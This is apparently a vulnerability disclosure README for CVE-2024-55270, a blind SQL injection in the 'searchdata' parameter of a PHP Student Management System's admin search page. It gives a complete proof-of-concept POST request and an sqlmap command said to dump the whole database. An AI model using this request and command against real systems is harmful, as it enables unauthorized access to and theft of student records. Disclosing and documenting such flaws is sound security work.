# Student Management System 1.0 (CVE-2024-55270)

## Overview

The Student Management System (SMS) is a web application developed using PHP and MySQL for managing student information. This repository contains the source code and details of the system, along with a security vulnerability report.

**Auditor:**  
Shoaib Alam - [LinkedIn Profile](https://www.linkedin.com/in/shoaib-alam-b53843203/)

---

## Security Vulnerability Report

### Description

A **Blind SQL Injection** vulnerability has been detected in the Student Management System. This issue affects the `searchdata` parameter in the search functionality of the application.

- **Vulnerable Endpoint:** `/studentms/admin/search.php`  
- **Vulnerable Parameter:** `searchdata`

The `searchdata` parameter is susceptible to Blind SQL Injection due to inadequate input sanitization. An attacker could exploit this vulnerability by injecting malicious SQL queries into the `searchdata` input, potentially gaining unauthorized access to the database or other sensitive information.

### Proof of Concept (PoC)

#### Vulnerable URL

`/studentms/admin/search.php`

#### Example POST Request

```http
POST /studentms/admin/search.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
Origin: http://localhost
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://localhost/studentms/admin/search.php
Cookie: PHPSESSID=kq90r1jv25kn4flrqd74v1miqd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

searchdata=*&search=
```

1. Save the above POST Request to req.txt using notepad or any text editor.

2. Use tool such as SQLMAP to exploit the above by applying this command (you can customize yours): sqlmap -r req.txt --dbs --random-agent --level 3 --risk 3

The above command will dump the entire database of the web application.
